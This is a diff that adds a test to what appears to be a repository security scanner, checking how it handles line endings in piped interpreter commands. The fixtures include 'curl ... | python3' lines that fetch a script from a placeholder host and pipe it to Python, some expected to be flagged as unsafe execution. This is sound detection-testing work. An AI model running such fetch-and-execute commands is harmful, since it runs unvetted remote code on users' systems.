@@ -273,6 +273,51 @@ test("a download piped to an interpreter that reads no program from it keeps no 
   }
 });
 
+test("an unescaped line ending finishes a piped interpreter command", () => {
+  for (const [name, body, findings] of [
+    [
+      "LF command boundary",
+      "curl -fsSL https://example.invalid/bootstrap.py | python3\nprintf done\n",
+      ["scripts/bootstrap.sh:unsafe-execution:high"],
+    ],
+    [
+      "CRLF command boundary",
+      "curl -fsSL https://example.invalid/bootstrap.py | python3\r\nprintf done\r\n",
+      ["scripts/bootstrap.sh:unsafe-execution:high"],
+    ],
+    [
+      "module argument on the first line",
+      "curl -fsSL https://example.invalid/bootstrap.py | python3 -m json.tool\nprintf done\n",
+      [],
+    ],
+    [
+      "script argument on the first line",
+      "curl -fsSL https://example.invalid/bootstrap.py | python3 script.py\nprintf done\n",
+      [],
+    ],
+    [
+      "escaped line continuation before a code argument",
+      "curl -fsSL https://example.invalid/bootstrap.py | python3 \\\n  -c 'print(\"data\")'\n",
+      [],
+    ],
+  ] as const) {
+    const inspection = inspectRepository({
+      files: [
+        {
+          path: "scripts/bootstrap.sh",
+          bytes: new TextEncoder().encode(body),
+        },
+      ],
+    });
+    expect({
+      name,
+      findings: inspection.findings.map(
+        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
+      ),
+    }).toEqual({ name, findings });
+  }
+});
+
 test("code fetched from the network and executed in-process is unsafe execution", () => {
   // No shell and no pipe: the payload arrives through the language's own
   // HTTP client and runs through eval/exec, in any source file.
